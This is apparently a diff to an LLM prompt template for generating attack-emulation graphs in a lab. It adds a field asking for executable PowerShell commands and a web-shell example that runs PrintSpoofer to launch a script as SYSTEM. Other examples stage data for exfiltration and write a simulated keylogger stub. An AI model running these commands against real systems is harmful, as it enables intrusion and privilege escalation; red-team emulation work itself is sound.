@@ -59,7 +59,8 @@ prompt: |
           username: "actual username"
           password: "actual password"
         payload: "actual filename"
-        # Include ANY other details mentioned (paths, ports, services, vulnerabilities, etc.)
+        commands: "PowerShell command in single line"  # IMPORTANT: Generate executable command here
+        # Include ANY other details mentioned
 
   edges:
     - from: "node_id"
@@ -112,7 +113,7 @@ prompt: |
     tactic: "exfiltration"
     description: "Compress data using Windows built-in tools"
     environment_specific:
-      command: "Compress-Archive -Path C:\\Windows\\Temp\\exfil\\* -DestinationPath C:\\Windows\\Temp\\data.zip"
+      commands: "Compress-Archive -Path C:\\Windows\\Temp\\exfil\\* -DestinationPath C:\\Windows\\Temp\\data.zip"
       tool: "PowerShell Compress-Archive"  # 2nd priority: native tool
   ```
 
@@ -128,8 +129,25 @@ prompt: |
     tactic: "credential-access"
     description: "Simulate keylogger deployment"
     environment_specific:
-      command: "echo 'keylogger stub' > C:\\Windows\\Temp\\perfcon.dat; Write-Output 'Keylogger installed (simulated)'"
+      commands: "echo 'keylogger stub' > C:\\Windows\\Temp\\perfcon.dat; Write-Output 'Keylogger installed (simulated)'"
       simulation: true  # 3rd priority: stub simulation
+  ```
+
+  **Example 4: Privilege escalation via web shell**
+
+  Environment says: "SeImpersonatePrivilege 권한이 있는 iis 서버 웹쉘을 이용해서 실행. Web shell at http://192.168.56.105/uploads/cmd.asp. PrintSpoofer64.exe and deploy.ps1 already copied to C:\\inetpub\\wwwroot\\uploads\\"
+
+  Correct node:
+  ```yaml
+  - id: "node_007"
+    name: "Execute Privilege Escalation"
+    tactic: "privilege-escalation"
+    description: "Use PrintSpoofer via web shell to escalate to SYSTEM"
+    environment_specific:
+      url: "http://192.168.56.105/uploads/cmd.asp"
+      method: "GET"
+      exploit: "PrintSpoofer64.exe"
+      commands: "Invoke-WebRequest -Uri 'http://192.168.56.105/uploads/cmd.asp?cmd=start /b C:\\inetpub\\wwwroot\\uploads\\PrintSpoofer64.exe -c \"powershell.exe -ExecutionPolicy Bypass -File C:\\inetpub\\wwwroot\\uploads\\deploy.ps1\"' -UseBasicParsing"
   ```
 
   **Note**: Technique IDs will be added automatically in post-processing using mitreattack-python.
